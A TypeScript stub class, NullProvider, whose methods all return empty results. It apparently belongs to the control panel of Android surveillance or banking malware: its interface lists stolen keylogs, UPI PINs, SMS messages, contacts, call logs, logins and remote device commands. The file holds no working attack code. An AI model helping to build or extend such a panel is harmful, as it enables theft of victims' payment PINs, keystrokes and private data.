import { IDeviceProvider, DeviceStats } from './base';

/**
 * NullProvider - A safe fallback that returns no data.
 * Used when no appId is provided to prevent accidental data leakage
 * from unrestricted providers.
 */
export class NullProvider implements IDeviceProvider {
    async listDevices(_limit: number = 100): Promise<any[]> {
        return [];
    }

    async getDevice(_deviceId: string): Promise<any> {
        return null;
    }

    async getDeviceStats(_deviceId: string): Promise<DeviceStats> {
        return { messages: 0, apps: 0, keylogs: 0, upiPins: 0 };
    }

    async getMessages(_deviceId: string, _limit: number = 100): Promise<any[]> {
        return [];
    }

    async getApps(_deviceId: string, _limit: number = 200): Promise<any[]> {
        return [];
    }

    async getKeylogs(_deviceId: string, _limit: number = 100): Promise<any[]> {
        return [];
    }

    async getUpiPins(_deviceId: string): Promise<any[]> {
        return [];
    }

    async getHeartbeat(_deviceId: string, _limit: number = 50): Promise<any[]> {
        return [];
    }

    async getSims(_deviceId: string): Promise<any[]> {
        return [];
    }

    async getNotifications(_deviceId: string, _limit: number = 100): Promise<any[]> {
        return [];
    }

    async getCallLogs(_deviceId: string, _limit: number = 100): Promise<any[]> {
        return [];
    }

    async getContacts(_deviceId: string): Promise<any[]> {
        return [];
    }

    async getLogins(_deviceId: string): Promise<any[]> {
        return [];
    }

    async sendCommand(_deviceId: string, _command: string, _payload: any): Promise<any> {
        throw new Error('No active application context. Command rejected.');
    }

    async listAllMessages(_limit: number = 100): Promise<any[]> {
        return [];
    }

    async listAllApps(_limit: number = 200): Promise<any[]> {
        return [];
    }

    async listAllKeylogs(_limit: number = 100): Promise<any[]> {
        return [];
    }

    async listAllUpiPins(_limit: number = 100): Promise<any[]> {
        return [];
    }
}
